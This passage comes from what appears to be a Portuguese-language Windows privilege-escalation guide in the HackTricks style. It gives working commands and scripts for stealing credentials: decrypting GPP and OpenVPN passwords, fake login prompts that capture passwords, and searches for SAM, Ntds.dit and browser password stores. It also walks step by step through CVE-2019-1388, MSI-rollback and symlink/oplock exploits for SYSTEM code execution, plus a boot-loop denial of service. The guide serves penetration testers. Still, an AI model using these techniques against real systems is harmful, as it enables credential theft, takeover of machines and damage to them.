Para reduzir esse risco, foi desenvolvida uma função para procurar arquivos GPP armazenados localmente que contenham um campo "cpassword" não vazio. Ao encontrar esse arquivo, a função descriptografa a senha e retorna um objeto PowerShell personalizado. Esse objeto inclui detalhes sobre o GPP e a localização do arquivo, auxiliando na identificação e correção dessa vulnerabilidade de segurança.

Procure em `C:\ProgramData\Microsoft\Group Policy\history` ou em _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (anterior ao W Vista)_ por estes arquivos:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Para descriptografar o cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Usando crackmapexec para obter as senhas:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### Configuração Web do IIS
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Exemplo de web.config com credenciais:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Credenciais do OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Solicitar credenciais

Você sempre pode **pedir ao usuário que insira suas credenciais ou até mesmo as credenciais de outro usuário** se achar que ele pode conhecê-las (observe que **pedir** diretamente ao cliente as **credenciais** é realmente **arriscado**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Possíveis nomes de arquivos contendo credenciais**

Arquivos conhecidos que, algum tempo atrás, continham **senhas** em **texto simples** ou **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Pesquise em todos os arquivos propostos:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credenciais na Lixeira

Você também deve verificar a Lixeira para procurar credenciais dentro dela

Para **recuperar senhas** salvas por vários programas, você pode usar: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Dentro do registro

**Outras possíveis chaves do registro com credenciais**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

Você deve procurar por dbs onde as senhas do **Chrome ou Firefox** estejam armazenadas.\
Verifique também o histórico, os bookmarks e os favoritos dos browsers, pois talvez algumas **senhas estejam** armazenadas neles.

Tools para extrair senhas dos browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** é uma tecnologia integrada ao sistema operacional Windows que permite a **intercomunicação** entre componentes de software de diferentes linguagens. Cada componente COM é **identificado por meio de um class ID (CLSID)** e cada componente expõe funcionalidades por meio de uma ou mais interfaces, identificadas por interface IDs (IIDs).

As classes e interfaces COM são definidas no registry em **HKEY\CLASSES\ROOT\CLSID** e **HKEY\CLASSES\ROOT\Interface**, respectivamente. Esse registry é criado pela mesclagem de **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Dentro dos CLSIDs desse registry, você pode encontrar o registry filho **InProcServer32**, que contém um valor padrão apontando para uma **DLL** e um valor chamado **ThreadingModel**, que pode ser **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single ou Multi) ou **Neutral** (Thread Neutral).

![Browsers History - COM DLL Overwriting: Dentro dos CLSIDs desse registry, você pode encontrar o registry filho InProcServer32, que contém um valor padrão apontando para uma DLL e um valor...](<../../images/image (729).png>)

Basicamente, se você puder **sobrescrever qualquer uma das DLLs** que serão executadas, poderá **escalate privileges** se essa DLL for executada por um usuário diferente.

Para aprender como atacantes usam COM Hijacking como mecanismo de persistência, verifique:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Procurar um arquivo com um determinado nome de arquivo**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Pesquise no registro por nomes de chaves e senhas**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Ferramentas que procuram por senhas

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **é um plugin do msf** que criei para **executar automaticamente todos os módulos POST do metasploit que procuram credenciais** dentro da vítima.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) procura automaticamente todos os arquivos que contêm senhas mencionados nesta página.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) é outra ótima ferramenta para extrair senhas de um sistema.

A ferramenta [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) procura por **sessões**, **nomes de usuário** e **senhas** de várias ferramentas que salvam esses dados em texto não criptografado (PuTTY, WinSCP, FileZilla, SuperPuTTY e RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine que **um processo executado como SYSTEM abra um novo processo** (`OpenProcess()`) **com acesso total**. O mesmo processo **também cria um novo processo** (`CreateProcess()`) **com baixos privilégios, mas herdando todos os handles abertos do processo principal**.\
Então, se você tiver **acesso total ao processo com poucos privilégios**, poderá obter o **handle aberto para o processo privilegiado criado** com `OpenProcess()` e **injetar um shellcode**.\
[Leia este exemplo para obter mais informações sobre **como detectar e explorar esta vulnerabilidade**.](leaked-handle-exploitation.md)\
[Leia [**esta outra publicação para uma explicação mais completa sobre como testar e abusar de mais handles abertos de processos e threads herdados com diferentes níveis de permissões (não apenas acesso total)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmentos de memória compartilhada, chamados de **pipes**, permitem a comunicação e a transferência de dados entre processos.

O Windows oferece um recurso chamado **Named Pipes**, que permite que processos não relacionados compartilhem dados, inclusive por redes diferentes. Isso se assemelha a uma arquitetura cliente/servidor, com funções definidas como **named pipe server** e **named pipe client**.

Quando os dados são enviados por um pipe por um **client**, o **server** que configurou o pipe tem a capacidade de **assumir a identidade** do **client**, desde que tenha os direitos **SeImpersonate** necessários. Identificar um **processo privilegiado** que se comunica por meio de um pipe que você possa imitar oferece uma oportunidade de **obter privilégios mais altos**, adotando a identidade desse processo assim que ele interagir com o pipe que você estabeleceu. Para obter instruções sobre como executar esse ataque, guias úteis podem ser encontrados [**aqui**](named-pipe-client-impersonation.md) e [**aqui**](#from-high-integrity-to-system).

Além disso, a ferramenta a seguir permite **interceptar uma comunicação de named pipe com uma ferramenta como o Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **e esta ferramenta permite listar e visualizar todos os pipes para encontrar privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

O serviço Telephony (TapiSrv), no modo server, expõe `\\pipe\\tapsrv` (MS-TRP). Um client remoto autenticado pode abusar do caminho de eventos assíncronos baseado em mailslot para transformar `ClientAttach` em uma **escrita arbitrária de 4 bytes** em qualquer arquivo existente gravável por `NETWORK SERVICE` e, então, obter direitos de administrador do Telephony e carregar uma DLL arbitrária como o serviço. Fluxo completo:

- `ClientAttach` com `pszDomainUser` definido como um caminho existente gravável → o serviço o abre por meio de `CreateFileW(..., OPEN_EXISTING)` e o utiliza para escritas de eventos assíncronos.
- Cada evento grava o `InitContext` controlado pelo atacante, proveniente de `Initialize`, nesse handle. Registre um app de linha com `LRegisterRequestRecipient` (`Req_Func 61`), acione `TRequestMakeCall` (`Req_Func 121`), obtenha os dados por meio de `GetAsyncEvents` (`Req_Func 0`) e, em seguida, faça unregister/shutdown para repetir escritas determinísticas.
- Adicione a si mesmo a `[TapiAdministrators]` em `C:\Windows\TAPI\tsec.ini`, reconecte-se e, então, chame `GetUIDllName` com um caminho arbitrário de DLL para executar `TSPI_providerUIIdentify` como `NETWORK SERVICE`.

Mais detalhes:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Diversos

### File Extensions that could execute stuff in Windows

Confira a página **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Links Markdown clicáveis encaminhados para `ShellExecuteExW` podem acionar URI handlers perigosos (`file:`, `ms-appinstaller:` ou qualquer scheme registrado) e executar arquivos controlados pelo atacante como o usuário atual. Veja:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Ao obter um shell como um usuário, pode haver scheduled tasks ou outros processos sendo executados que **passam credenciais na linha de comando**. O script abaixo captura as linhas de comando dos processos a cada dois segundos e compara o estado atual com o estado anterior, exibindo quaisquer diferenças.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Roubo de senhas de processos

## De usuário com poucos privilégios para NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Se você tiver acesso à interface gráfica (por meio do console ou RDP) e o UAC estiver habilitado, em algumas versões do Microsoft Windows será possível executar um terminal ou qualquer outro processo como "NT\AUTHORITY SYSTEM" a partir de um usuário sem privilégios.

Isso possibilita escalar privilégios e realizar UAC Bypass ao mesmo tempo, explorando a mesma vulnerabilidade. Além disso, não há necessidade de instalar nada, e o binário utilizado durante o processo é assinado e emitido pela Microsoft.

Alguns dos sistemas afetados são os seguintes:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Para explorar esta vulnerabilidade, é necessário realizar as seguintes etapas:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## De Administrator com Integridade Média para Alto Nível de Integridade / UAC Bypass

Leia isto para **aprender sobre Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Depois, **leia isto para aprender sobre UAC e UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## De Exclusão/Movimentação/Renomeação Arbitrária de Pastas para SYSTEM EoP

A técnica descrita [**nesta publicação do blog**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), com um exploit code [**disponível aqui**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

O ataque consiste basicamente em abusar do recurso de rollback do Windows Installer para substituir arquivos legítimos por arquivos maliciosos durante o processo de desinstalação. Para isso, o atacante precisa criar um **malicious MSI installer**, que será usado para sequestrar a pasta `C:\Config.Msi`, posteriormente usada pelo Windows Installer para armazenar arquivos de rollback durante a desinstalação de outros pacotes MSI, cujos arquivos de rollback terão sido modificados para conter o payload malicioso.

A técnica resumida é a seguinte:

1. **Stage 1 – Preparação do Hijack (manter `C:\Config.Msi` vazia)**

- Step 1: Instalar o MSI
- Crie um `.msi` que instale um arquivo inofensivo (por exemplo, `dummy.txt`) em uma pasta com permissão de escrita (`TARGETDIR`).
- Marque o installer como **"UAC Compliant"**, para que um **non-admin user** possa executá-lo.
- Mantenha um **handle** aberto para o arquivo após a instalação.

- Step 2: Iniciar a desinstalação
- Desinstale o mesmo `.msi`.
- O processo de desinstalação começa a mover os arquivos para `C:\Config.Msi` e renomeá-los para arquivos `.rbf` (backups de rollback).
- Faça **poll do handle aberto** usando `GetFinalPathNameByHandle` para detectar quando o arquivo se tornar `C:\Config.Msi\<random>.rbf`.

- Step 3: Sincronização personalizada
- O `.msi` inclui uma **custom uninstall action (`SyncOnRbfWritten`)** que:
- Sinaliza quando o `.rbf` foi gravado.
- Em seguida, **aguarda** outro evento antes de continuar a desinstalação.

- Step 4: Bloquear a exclusão do `.rbf`
- Quando for sinalizado, **abra o arquivo `.rbf`** sem `FILE_SHARE_DELETE` — isso **impede que ele seja excluído**.
- Em seguida, **sinalize de volta** para que a desinstalação possa ser concluída.
- O Windows Installer falha ao excluir o `.rbf` e, como não consegue excluir todo o conteúdo, `C:\Config.Msi` não é removida.

- Step 5: Excluir manualmente o `.rbf`
- Você (atacante) exclui o arquivo `.rbf` manualmente.
- Agora `C:\Config.Msi` está vazia, pronta para ser sequestrada.

> Neste ponto, **ative a vulnerabilidade de exclusão arbitrária de pastas em nível SYSTEM** para excluir `C:\Config.Msi`.

2. **Stage 2 – Substituição dos Scripts de Rollback por Scripts Maliciosos**

- Step 6: Recriar `C:\Config.Msi` com ACLs Fracas
- Recrie você mesmo a pasta `C:\Config.Msi`.
- Defina **DACLs fracas** (por exemplo, Everyone:F) e **mantenha um handle aberto** com `WRITE_DAC`.

- Step 7: Executar outra instalação
- Instale o `.msi` novamente, com:
- `TARGETDIR`: Local com permissão de escrita.
- `ERROROUT`: Uma variável que aciona uma falha forçada.
- Essa instalação será usada para acionar o **rollback** novamente, que lê `.rbs` e `.rbf`.

- Step 8: Monitorar por `.rbs`
- Use `ReadDirectoryChangesW` para monitorar `C:\Config.Msi` até que um novo `.rbs` apareça.
- Capture o nome do arquivo.

- Step 9: Sincronizar antes do Rollback
- O `.msi` contém uma **custom install action (`SyncBeforeRollback`)** que:
- Sinaliza um evento quando o `.rbs` é criado.
- Em seguida, **aguarda** antes de continuar.

- Step 10: Reaplicar a ACL Fraca
- Depois de receber o evento `.rbs created`:
- O Windows Installer **reaplica ACLs fortes** a `C:\Config.Msi`.
- Porém, como você ainda possui um handle com `WRITE_DAC`, pode **reaplicar as ACLs fracas** novamente.

> As ACLs são **aplicadas somente quando o handle é aberto**, portanto, você ainda pode gravar na pasta.

- Step 11: Inserir `.rbs` e `.rbf` Falsos
- Sobrescreva o arquivo `.rbs` com um **fake rollback script** que instrua o Windows a:
- Restaurar seu arquivo `.rbf` (DLL maliciosa) em um **local privilegiado** (por exemplo, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Insira seu `.rbf` falso contendo uma **malicious SYSTEM-level payload DLL**.

- Step 12: Acionar o Rollback
- Sinalize o evento de sincronização para que o installer continue.
- Uma **type 19 custom action (`ErrorOut`)** é configurada para **falhar intencionalmente a instalação** em um ponto conhecido.
- Isso faz com que o **rollback seja iniciado**.

- Step 13: O SYSTEM Instala sua DLL
- O Windows Installer:
- Lê seu `.rbs` malicioso.
- Copia a DLL `.rbf` para o local de destino.
- Agora você tem sua **DLL maliciosa em um caminho carregado pelo SYSTEM**.

- Etapa final: Executar código como SYSTEM
- Execute um **auto-elevated binary** confiável (por exemplo, `osk.exe`) que carregue a DLL sequestrada.
- **Boom**: seu código é executado **como SYSTEM**.


### De Exclusão/Movimentação/Renomeação Arbitrária de Arquivos para SYSTEM EoP

A técnica principal de rollback do MSI (a anterior) presume que você pode excluir uma **pasta inteira** (por exemplo, `C:\Config.Msi`). Mas e se sua vulnerabilidade permitir apenas a **exclusão arbitrária de arquivos**?

Você poderia explorar **internals do NTFS**: toda pasta possui um alternate data stream oculto chamado:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Esta stream armazena os **metadados de índice** da pasta.

Portanto, se você **excluir a stream `::$INDEX_ALLOCATION`** de uma pasta, o NTFS **remove a pasta inteira** do sistema de arquivos.

Você pode fazer isso usando APIs padrão de exclusão de arquivos, como:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Mesmo que você esteja chamando uma API de exclusão de *arquivo*, ela **exclui a própria pasta**.

### Da Exclusão do Conteúdo da Pasta à Elevação de Privilégios para SYSTEM
E se sua primitiva não permitir excluir arquivos/pastas arbitrários, mas **permitir a exclusão do *conteúdo* de uma pasta controlada pelo atacante**?

1. Etapa 1: Configure uma pasta e um arquivo-isca
- Crie: `C:\temp\folder1`
- Dentro dela: `C:\temp\folder1\file1.txt`

2. Etapa 2: Coloque um **oplock** em `file1.txt`
- O oplock **pausa a execução** quando um processo privilegiado tenta excluir `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Etapa 3: Acionar o processo SYSTEM (por exemplo, `SilentCleanup`)
- Esse processo verifica pastas (por exemplo, `%TEMP%`) e tenta excluir seu conteúdo.
- Quando chega a `file1.txt`, o **oplock é acionado** e transfere o controle para seu callback.

4. Etapa 4: Dentro do callback do oplock – redirecionar a exclusão

- Opção A: Mover `file1.txt` para outro local
- Isso esvazia `folder1` sem interromper o oplock.
- Não exclua `file1.txt` diretamente — isso liberaria o oplock prematuramente.

- Opção B: Converter `folder1` em uma **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opção C: Crie um **symlink** em `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Isso tem como alvo o stream interno do NTFS que armazena os metadados da pasta — excluí-lo exclui a pasta.

5. Etapa 5: Liberar o oplock
- O processo SYSTEM continua e tenta excluir `file1.txt`.
- Mas agora, devido à junction + symlink, ele está, na verdade, excluindo:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Resultado**: `C:\Config.Msi` é excluída pelo SYSTEM.

### De Criação de Pasta Arbitrária a DoS Permanente

Explore uma primitiva que permite **criar uma pasta arbitrária como SYSTEM/admin** — mesmo que **você não possa gravar arquivos** ou **definir permissões fracas**.

Crie uma **pasta** (não um arquivo) com o nome de um **driver crítico do Windows**, por exemplo:
```
C:\Windows\System32\cng.sys
```
- Esse caminho normalmente corresponde ao driver em modo kernel `cng.sys`.
- Se você **o pré-criar como uma pasta**, o Windows não consegue carregar o driver real durante a inicialização.
- Em seguida, o Windows tenta carregar `cng.sys` durante a inicialização.
- Ele encontra a pasta, **não consegue resolver o driver real** e **trava ou interrompe a inicialização**.
- Não há **fallback** nem **recuperação** sem intervenção externa (por exemplo, reparo da inicialização ou acesso ao disco).

### De caminhos privilegiados de logs/backup + symlinks OM para sobrescrita arbitrária de arquivos / boot DoS

Quando um **serviço privilegiado** grava logs/exportações em um caminho lido de uma **configuração gravável**, redirecione esse caminho usando **symlinks do Object Manager + pontos de montagem NTFS** para transformar a gravação privilegiada em uma sobrescrita arbitrária (mesmo **sem SeCreateSymbolicLinkPrivilege**).

**Requisitos**
- A configuração que armazena o caminho de destino é gravável pelo atacante (por exemplo, `%ProgramData%\...\.ini`).
- Capacidade de criar um ponto de montagem para `\RPC Control` e um symlink de arquivo do OM (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Uma operação privilegiada que grave nesse caminho (log, exportação, relatório).

**Cadeia de exemplo**
1. Leia a configuração para recuperar o destino do log privilegiado, por exemplo, `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` em `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Redirecione o caminho sem privilégios administrativos:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Aguarde até que o componente privilegiado grave o log (por exemplo, o administrador aciona "enviar SMS de teste"). A gravação passa a ocorrer em `C:\Windows\System32\cng.sys`.
4. Inspecione o alvo sobrescrito (com um parser de hex/PE) para confirmar a corrupção; a reinicialização força o Windows a carregar o caminho do driver adulterado → **DoS por boot loop**. Isso também se aplica a qualquer arquivo protegido que um serviço privilegiado abra para gravação.

> `cng.sys` normalmente é carregado de `C:\Windows\System32\drivers\cng.sys`, mas, se existir uma cópia em `C:\Windows\System32\cng.sys`, ela pode ser tentada primeiro, tornando-a um destino confiável de DoS para dados corrompidos.



## **De High Integrity para SYSTEM**

### **Novo serviço**

Se você já estiver executando um processo de High Integrity, o **caminho para SYSTEM** pode ser fácil: basta **criar e executar um novo serviço**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Ao criar um binário de service, certifique-se de que ele seja um service válido ou que o binário execute as ações necessárias rapidamente, pois será encerrado em 20s se não for um service válido.

### AlwaysInstallElevated

A partir de um processo de High Integrity, você pode tentar **enable the AlwaysInstallElevated registry entries** e **install** um reverse shell usando um wrapper _**.msi**_.\
[Mais informações sobre as registry keys envolvidas e sobre como instalar um pacote _.msi_ aqui.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Você pode** [**encontrar o código aqui**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Se você tiver esses token privileges (provavelmente os encontrará em um processo de High Integrity), poderá **abrir quase qualquer processo** (exceto protected processes) com o SeDebug privilege, **copiar o token** do processo e criar um **processo arbitrário com esse token**.\
Usando essa técnica, normalmente é **selecionado qualquer processo executando como SYSTEM com todos os token privileges** (_sim, você pode encontrar processos SYSTEM sem todos os token privileges_).\
**Você pode encontrar um** [**exemplo de código executando a técnica proposta aqui**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Essa técnica é usada pelo meterpreter para escalar privilégios em `getsystem`. A técnica consiste em **criar um pipe e, em seguida, criar/abusar de um service para escrever nesse pipe**. Depois, o **server** que criou o pipe usando o **`SeImpersonate`** privilege poderá **impersonate o token** do pipe client (o service), obtendo privilégios SYSTEM.\
Se quiser [**aprender mais sobre named pipes, leia isto**](#named-pipe-client-impersonation).\
Se quiser ler um exemplo de [**como passar de high integrity para System usando named pipes, leia isto**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Se você conseguir **hijack uma dll** que esteja sendo **carregada** por um **processo** executando como **SYSTEM**, poderá executar código arbitrário com essas permissões. Portanto, Dll Hijacking também é útil para esse tipo de privilege escalation e, além disso, é muito **mais fácil de obter a partir de um processo de high integrity**, pois ele terá **write permissions** nas pastas usadas para carregar dlls.\
**Você pode** [**aprender mais sobre Dll hijacking aqui**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Leia:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Mais ajuda

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Ferramentas úteis

**Melhor ferramenta para procurar vetores de Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Verifica misconfigurations e sensitive files (**[**verifique aqui**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detectado.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Verifica algumas possíveis misconfigurations e coleta informações (**[**verifique aqui**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Verifica misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrai informações de sessões salvas do PuTTY, WinSCP, SuperPuTTY, FileZilla e RDP. Use -Thorough localmente.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrai crendentials do Credential Manager. Detectado.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Faz spray das passwords coletadas no domínio**\
